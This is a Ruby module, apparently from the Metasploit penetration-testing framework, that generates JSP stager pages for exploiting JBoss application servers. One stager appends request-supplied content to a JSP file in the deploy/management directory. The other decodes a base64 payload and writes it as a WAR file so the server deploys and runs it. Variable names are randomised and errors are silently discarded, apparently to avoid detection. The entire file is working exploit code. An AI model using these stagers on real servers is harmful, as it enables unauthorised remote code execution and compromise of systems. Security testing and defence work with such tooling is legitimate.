# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::JBoss::DeploymentFileRepositoryScripts

  # Generate a stager JSP to write the second stager to the
  # deploy/management directory. It is only used with HEAD/GET requests
  # to overcome the size limit in those requests
  #
  # @param stager_base [String] The name of the base of the stager.
  # @param stager_jsp_name [String] The name name of the jsp stager.
  # @return [String] The JSP head stager.
  def head_stager_jsp(stager_base, stager_jsp_name)
    content_var = Rex::Text.rand_text_alpha(8+rand(8))
    file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
    jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
    fos_var = Rex::Text.rand_text_alpha(8+rand(8))
    bw_var = Rex::Text.rand_text_alpha(8+rand(8))
    head_stager_jsp_code = <<-EOT
<%@page import="java.io.*,
  java.util.*"
%>
<%
  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{stager_base}.war/" + "#{stager_jsp_name}" + ".jsp";
  try {
    String #{content_var} = "";
    String parameterName = (String)(request.getParameterNames().nextElement());
    #{content_var} = request.getParameter(parameterName);
    FileWriter #{fos_var} = new FileWriter(#{file_path_var}, true);
    BufferedWriter #{bw_var} = new BufferedWriter(#{fos_var});
    #{bw_var}.write(#{content_var});
    #{bw_var}.close();
  }
  catch(Exception e) { }
%>
    EOT
    head_stager_jsp_code
  end

  # Generate a stager JSP to write a WAR file to the deploy/ directory.
  # This is used to bypass the size limit for GET/HEAD requests.
  #
  # @param app_base [String] The name of the WAR app to write.
  # @return [String] The JSP stager.
  def stager_jsp_with_payload(app_base, encoded_payload)
    decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
    file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
    jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
    fos_var = Rex::Text.rand_text_alpha(8+rand(8))
    content_var = Rex::Text.rand_text_alpha(8+rand(8))

    stager_jsp = <<-EOT
<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>
<%
  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{app_base}.war";
  try {
    String #{content_var} = "#{encoded_payload}";
    FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
    byte[] #{decoded_var} = new BASE64Decoder().decodeBuffer(#{content_var});
    #{fos_var}.write(#{decoded_var});
    #{fos_var}.close();
  }
  catch(Exception e){ }
%>
    EOT

    stager_jsp
  end



end
